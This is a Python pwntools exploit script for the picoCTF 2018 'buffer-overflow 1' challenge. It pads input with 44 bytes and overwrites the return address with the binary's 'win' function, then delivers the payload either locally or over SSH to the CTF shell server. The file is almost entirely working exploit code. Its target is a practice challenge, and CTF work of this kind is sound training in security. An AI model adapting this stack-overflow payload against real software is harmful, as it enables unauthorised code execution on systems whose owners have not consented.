#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

# Payload settings
vuln = ELF('./vuln')
winaddr = p32(vuln.symbols['win'])
padding = 'A' * 44
payload = padding + winaddr

# Run local
def local():
	io = vuln.process()
	io.sendline(payload)
	print(io.recvall())

def remote():
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613; ./vuln')
	print(io.recv())
	io.sendline(payload)
	print(io.recv())
	s.close()

if __name__ == '__main__':
	remote()